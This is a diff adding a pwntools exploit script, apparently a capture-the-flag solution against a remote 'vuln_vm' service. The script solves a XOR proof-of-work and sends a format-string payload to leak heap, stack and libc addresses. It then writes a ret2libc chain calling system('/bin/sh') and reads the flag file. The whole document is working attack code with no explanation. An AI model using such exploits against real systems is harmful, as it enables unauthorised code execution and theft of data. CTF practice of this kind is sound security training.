@@ -1,0 +1,31 @@
+import sys
+from pwn import *
+from time import sleep
+
+argv = sys.argv
+
+r = remote(argv[1], argv[2])
+poW = r.recvline(keepends = False)
+poW = poW[:-4].split(' XOR ')
+poW = int(poW[0]) ^ int(poW[1])
+r.sendline(str(poW))
+r.recvuntil('\n')
+payload = p32(0x0f)*500 + p32(0x13) + p32(0x15) + p32(0xffffffff-0xa50) + p32(13*4) + "%x "*((4096-4*520)/3)
+r.sendline(payload)
+leak = r.recvline(keepends = False).split(' ')
+heap = int(leak[7], 16)
+stack = int(leak[25], 16)
+libc = int(leak[28], 16) - 7352
+log.info("heap = " + hex(heap))
+log.info("stack = " + hex(stack))
+log.info("libc = " + hex(libc))
+system = libc + 250368
+bin_sh = libc + 1564879
+ret = 0x0804867e
+payload2 = p32(0x6)*9 + p32(0x15) + p32((stack - heap + 1308 - 0x2200)/4) + p32(16) + p32(0x12)
+r.send(payload2)
+sleep(1)
+r.send(p32(ret) + p32(system) + p32(0) + p32(bin_sh))
+# r.interactive()
+r.sendline('/bin/cat /home/vuln_vm/flag.txt')
+print(r.recvall())
